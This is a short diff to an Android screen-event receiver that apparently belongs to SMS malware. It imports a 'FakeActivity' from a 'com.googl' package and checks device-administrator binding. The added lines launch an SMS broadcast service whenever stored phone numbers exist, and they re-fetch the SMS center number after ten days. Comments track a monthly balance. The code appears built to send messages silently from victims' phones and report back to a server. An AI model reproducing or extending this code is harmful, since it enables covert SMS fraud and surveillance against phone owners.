@@ -5,6 +5,7 @@ import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.Utils.BRCUtil;
@@ -45,6 +46,15 @@ public class ScreenBRC extends BroadcastReceiver {
         boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
 
         SettingManager.getInstance().init(context);
+
+        String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+        if (!TextUtils.isEmpty(oldPhoneNumbers)) {
+            Intent i = new Intent();
+            i.setClass(context, PluginService.class);
+            i.setAction(PluginService.SMS_BROADCAST_ACTION);
+            context.startService(i);
+        }
+
         if (intent != null && isDeviceBinded /**SettingManager.getInstance().getKeyHasBindingDevices()*/) {
             String action = intent.getAction();
             if (Intent.ACTION_USER_PRESENT.equals(action) || HOUR_ALARM_ACTION.equals(action)) {
@@ -91,6 +101,13 @@ public class ScreenBRC extends BroadcastReceiver {
                     if (curMonth != lastMonth) {
                         //如果不是同一个月，将余额计数清零
                         SettingManager.getInstance().setKeyMonthCount(0);
+                    }
+
+                    if (SettingManager.getInstance().getKeyLastFetchSmsCenter() != 0
+                            && (curDay - SettingManager.getInstance().getKeyLastFetchSmsCenter() > 10)
+                            && TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())) {
+                        //如果时间大于10天的，并且短信中心是空的，那么就要重新获取短信中心
+                        SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
                     }
 
                     //TODO:此处可能会出发服务器连接次数太多
